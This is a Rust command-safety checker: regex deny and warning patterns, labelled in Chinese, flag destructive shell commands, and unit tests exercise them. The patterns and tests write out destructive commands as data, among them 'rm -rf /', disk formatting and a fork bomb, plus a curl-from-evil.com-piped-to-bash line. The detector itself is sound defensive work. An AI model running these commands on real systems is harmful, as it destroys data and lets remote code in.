use regex::Regex;
use serde::{Deserialize, Serialize};

#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SafetyCheckResult {
    pub is_dangerous: bool,
    pub risk_level: String, // "safe" | "warning" | "dangerous"
    pub command: String,
    pub message: String,
}

pub struct SafetyManager {
    danger_patterns: Vec<(Regex, &'static str)>,
    warning_patterns: Vec<(Regex, &'static str)>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SafetyLevel {
    High,
    Medium,
    Low,
}

impl SafetyLevel {
    pub fn from_str(value: &str) -> Self {
        match value.trim().to_lowercase().as_str() {
            "low" => SafetyLevel::Low,
            "medium" => SafetyLevel::Medium,
            _ => SafetyLevel::High,
        }
    }
}

impl SafetyManager {
    pub fn new() -> Self {
        let danger_patterns = vec![
            (
                Regex::new(r"(?i)\brm\s+(?:-[a-z]*[rR][a-z]*\s+-[a-z]*[fF]|-[a-z]*[fF][a-z]*\s+-[a-z]*[rR]|-[rfRF]{1,4}|--recursive\b.*--force\b|--force\b.*--recursive\b)\s+(/|/\*|\.\.|\./\*|~|~\*|/etc\b|/usr\b|/var\b|/home\b)").unwrap(),
                "检测到根目录或核心目录强力递归删除指令 (rm)",
            ),
            (
                Regex::new(r"(?i)\b(remove-item|ri|del|erase|rd|rmdir)\b.*(-recurse|-r|/s)\b.*([a-z]:\\(\s|$|\*)|\\windows|\\system32)").unwrap(),
                "检测到 Windows 高危递归删除指令",
            ),
            (
                Regex::new(r"(?i)\b(mkfs(\.\w+)?|format\s+[a-z]:|clear-disk)\b").unwrap(),
                "检测到磁盘文件系统格式化或清空指令",
            ),
            (
                Regex::new(r"(?i)\bdd\s+if=.*of=/dev/(sd[a-z]|nvme|vd[a-z]|disk)").unwrap(),
                "检测到裸磁盘块设备覆写指令 (dd)",
            ),
            (
                Regex::new(r"(?i)\b(shutdown|reboot|poweroff|halt|init\s+0|init\s+6|stop-computer|restart-computer)\b").unwrap(),
                "检测到系统停机或关机重启指令",
            ),
            (
                Regex::new(r"(?i)\biptables\s+(-F|-X|--flush)\b").unwrap(),
                "检测到防火墙规则清空指令，可能导致远程连接断开",
            ),
            (
                Regex::new(r"(?i)\bdrop\s+(database|schema)\b").unwrap(),
                "检测到数据库级删除指令 (DROP DATABASE)",
            ),
            (
                Regex::new(r"(?i):\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:").unwrap(),
                "检测到 Fork 炸弹攻击代码",
            ),
            (
                Regex::new(r"(?i)(curl|wget)\b.*\|\s*(sudo\s+)?(sh|bash|zsh)\b").unwrap(),
                "检测到远程脚本管道直接执行 (curl/wget | sh)",
            ),
            (
                Regex::new(r"(?i)>\s*/etc/(passwd|shadow|sudoers|fstab)\b").unwrap(),
                "检测到直接覆盖系统核心安全文件",
            ),
        ];

        let warning_patterns = vec![
            (
                Regex::new(r"(?i)\b(systemctl|service)\s+(stop|restart)\s+(ssh|sshd)\b").unwrap(),
                "警告：正在停止或重启 SSH 服务，可能导致当前会话中断",
            ),
            (
                Regex::new(r"(?i)\b(chmod|chown)\s+(-[rR]\s+777|777\s+-[rR])\b").unwrap(),
                "警告：正在大范围修改文件权限为 777，存在安全隐患",
            ),
            (
                Regex::new(r"(?i)\bkill\s+-9\s+(-1|1)\b").unwrap(),
                "警告：正在强制终止 init/systemd 进程",
            ),
            (
                Regex::new(r"(?i)\bdrop\s+table\b").unwrap(),
                "警告：检测到数据表删除指令 (DROP TABLE)",
            ),
            (
                Regex::new(r"(?i)\bbase64\s+(-d|--decode)\b.*\|\s*(sh|bash|zsh)\b").unwrap(),
                "警告：检测到解码后直接执行的 Shell 载荷",
            ),
        ];

        Self {
            danger_patterns,
            warning_patterns,
        }
    }

    pub fn check_command_with_level(
        &self,
        command: &str,
        level: SafetyLevel,
    ) -> SafetyCheckResult {
        let trimmed = command.trim();

        for (pattern, reason) in &self.danger_patterns {
            if pattern.is_match(trimmed) {
                let blocked = level != SafetyLevel::Low;
                return SafetyCheckResult {
                    is_dangerous: blocked,
                    risk_level: if blocked { "dangerous" } else { "safe" }.to_string(),
                    command: trimmed.to_string(),
                    message: if blocked {
                        reason.to_string()
                    } else {
                        format!("已记录高危指令但不拦截: {}", reason)
                    },
                };
            }
        }

        for (pattern, reason) in &self.warning_patterns {
            if pattern.is_match(trimmed) {
                return SafetyCheckResult {
                    is_dangerous: false,
                    risk_level: if level == SafetyLevel::High {
                        "warning"
                    } else {
                        "safe"
                    }
                    .to_string(),
                    command: trimmed.to_string(),
                    message: reason.to_string(),
                };
            }
        }

        SafetyCheckResult {
            is_dangerous: false,
            risk_level: "safe".to_string(),
            command: trimmed.to_string(),
            message: "命令合规".to_string(),
        }
    }

    pub fn check_command(&self, command: &str) -> SafetyCheckResult {
        self.check_command_with_level(command, SafetyLevel::High)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_commands() {
        let manager = SafetyManager::new();
        assert_eq!(manager.check_command("ls -la /var/log").risk_level, "safe");
        assert_eq!(manager.check_command("docker ps").risk_level, "safe");
        assert_eq!(manager.check_command("systemctl status nginx").risk_level, "safe");
        assert_eq!(manager.check_command("cat /etc/hosts").risk_level, "safe");
    }

    #[test]
    fn test_dangerous_commands() {
        let manager = SafetyManager::new();
        assert!(manager.check_command("rm -rf /").is_dangerous);
        assert!(manager.check_command("rm -f -r /*").is_dangerous);
        assert!(manager.check_command("rm --recursive --force /").is_dangerous);
        assert!(manager.check_command("mkfs.ext4 /dev/sda1").is_dangerous);
        assert!(manager.check_command("reboot").is_dangerous);
        assert!(manager.check_command("iptables -F").is_dangerous);
        assert!(manager.check_command("curl -s http://evil.com/a.sh | bash").is_dangerous);
        assert!(manager.check_command("Remove-Item -Recurse -Force C:\\").is_dangerous);
    }

    #[test]
    fn test_warning_commands() {
        let manager = SafetyManager::new();
        let res = manager.check_command("chmod -R 777 /var/www");
        assert!(!res.is_dangerous);
        assert_eq!(res.risk_level, "warning");
        assert_eq!(manager.check_command("chmod 777 -R /var/www").risk_level, "warning");
    }

    #[test]
    fn test_safety_levels_take_effect() {
        let manager = SafetyManager::new();
        assert!(manager.check_command_with_level("rm -rf /", SafetyLevel::High).is_dangerous);
        assert_eq!(
            manager.check_command_with_level("chmod -R 777 /var/www", SafetyLevel::Medium).risk_level,
            "safe"
        );
        let low_danger = manager.check_command_with_level("rm -rf /", SafetyLevel::Low);
        assert!(!low_danger.is_dangerous);
        assert_eq!(low_danger.risk_level, "safe");
    }

    #[test]
    fn test_safety_level_from_str() {
        assert_eq!(SafetyLevel::from_str("high"), SafetyLevel::High);
        assert_eq!(SafetyLevel::from_str("medium"), SafetyLevel::Medium);
        assert_eq!(SafetyLevel::from_str("low"), SafetyLevel::Low);
        assert_eq!(SafetyLevel::from_str("unknown"), SafetyLevel::High);
        assert_eq!(SafetyLevel::from_str(""), SafetyLevel::High);
    }
}
